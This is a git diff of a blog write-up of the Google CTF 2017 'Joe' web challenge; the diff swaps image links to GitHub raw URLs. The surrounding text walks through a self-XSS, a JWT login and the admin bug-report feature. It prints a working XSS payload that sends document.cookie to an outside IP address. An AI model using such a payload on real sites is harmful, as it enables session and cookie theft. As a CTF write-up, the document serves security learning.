@@ -9,7 +9,7 @@ _If you can find a vulnerability that makes it possible to steal the cookies of 
 
 [Challenge url](https://joe.web.ctfcompetition.com)
 
-![Joe_screenshot.png]({{site.baseurl}}/_posts/Joe_screenshot.png)
+![Joe_screenshot.png](https://raw.githubusercontent.com/Buffer0x7cd/buffer0x7cd.github.io/master/_posts/Joe_screenshot.png)
 
 Initial reconnaissance led me to the following features.
 
@@ -20,7 +20,7 @@ Initial reconnaissance led me to the following features.
 
 Another interesting point was that if we try to use the link provided for admin login then we getting the following result.
 
-![joe_admin_login.png]({{site.baseurl}}/_posts/joe_admin_login.png)
+![joe_admin_login.png](https://raw.githubusercontent.com/Buffer0x7cd/buffer0x7cd.github.io/master/_posts/joe_admin_login.png)
 
 
 
@@ -32,7 +32,7 @@ Cookie theft is often facilitated through XSS (cross-site scripting), so I asked
 
 
 Refreshing the page led to successful self XSS
-![joe_test.png]({{site.baseurl}}/_posts/joe_test.png)
+![joe_test.png](https://raw.githubusercontent.com/Buffer0x7cd/buffer0x7cd.github.io/master/_posts/joe_test.png)
 
 
 But this payload is executing in self context a.k.a. "selfxss".Now I proceeded to focus on leveraging this against the "administrator" user. Reporting a bug to admin seems an intersting attack surface for this purpose. we can use this feature to report a bug by supplying a valid report URL (prefixed with HTTP/S) and CAPTCHA response.
@@ -40,7 +40,7 @@ But this payload is executing in self context a.k.a. "selfxss".Now I proceeded t
 
 But after trying a few times I am still not able to exploit this feature. So i decided to take a look on the login feature. where i found [JSON Web Token](https://jwt.io/) parameter in a login request:
 
-![Screenshot from 2017-07-03 15-57-08.png]({{site.baseurl}}/_posts/Screenshot from 2017-07-03 15-57-08.png)
+![Screenshot from 2017-07-03 15-57-08.png](https://raw.githubusercontent.com/Buffer0x7cd/buffer0x7cd.github.io/master/_posts/Screenshot%20from%202017-07-03%2015-57-08.png)
 
 
 
@@ -52,19 +52,19 @@ I found that the above URL could be used to log into my account with a valid JWT
 
 ```<script>img = new Image(); img.src="https://139.59.74.204/cookie?q="+document.cookie;alert("done");//</script>```
 
-![selfxss.png]({{site.baseurl}}/_posts/selfxss.png)
+![selfxss.png](https://raw.githubusercontent.com/Buffer0x7cd/buffer0x7cd.github.io/master/_posts/selfxss.png)
 
 As you can see in above image that the payload executed successfully. Now all i need is to issue a bug report for admin and sent my tokenised URL to Joe, but this url was rejected due to excess length.
 
 
-![joe_url_too_big.png]({{site.baseurl}}/_posts/joe_url_too_big.png)
+![joe_url_too_big.png](https://raw.githubusercontent.com/Buffer0x7cd/buffer0x7cd.github.io/master/_posts/joe_url_too_big.png)
 
 So i used google's link shortner service and sent the new url as a bug report. Which is get accepted successfully.
 
-![Screenshot from 2017-07-03 15-59-36.png]({{site.baseurl}}/_posts/Screenshot from 2017-07-03 15-59-36.png)
+![Screenshot from 2017-07-03 15-59-36.png](https://raw.githubusercontent.com/Buffer0x7cd/buffer0x7cd.github.io/master/_posts/Screenshot%20from%202017-07-03%2015-59-36.png)
 
 Now all i needed is to check the access log of apache that is running on my VPS.
-![joe_flag.png]({{site.baseurl}}/_posts/joe_flag.png)
+![joe_flag.png](https://raw.githubusercontent.com/Buffer0x7cd/buffer0x7cd.github.io/master/_posts/joe_flag.png)
 
 And this way i got the access of admin's flag cookie.
 
